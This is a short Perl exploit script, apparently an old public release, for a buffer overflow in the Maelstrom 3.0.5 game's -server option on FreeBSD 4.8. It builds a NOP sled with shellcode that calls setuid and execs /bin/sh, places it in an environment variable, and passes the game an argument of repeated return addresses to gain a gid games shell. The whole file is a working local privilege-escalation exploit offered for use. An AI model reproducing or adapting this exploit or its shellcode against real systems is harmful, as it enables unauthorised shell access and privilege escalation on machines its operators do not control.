#!/usr/bin/perl
# kokanin/DSR, gid games crap for /usr/ports/games/maelstrom -server bug
found by
# Luca Ercoli. This (ret/offset/shellcode) is made for FreeBSD 4.8-RELEASE.
# maelstrom-3.0.5     Asteroids-style game for X Window System
# shellcode by eSDee, he's cool. AV crap + .pl files + mailinglists ==
flooded mbox #¤%
$len = 1000;
$ret = pack("l",0xbfbffb7f);
$nop = "\x90";
$offset = 0;
$shellcode =    "\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68".
                "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
                "\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

for ($i = 0; $i < $len - length($shellcode); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
local($ENV{'EGG'}) = $buffer;
$cakeman = "1\@A" . $ret x 255 ;
exec("/usr/X11R6/bin/Maelstrom  -server $cakeman");

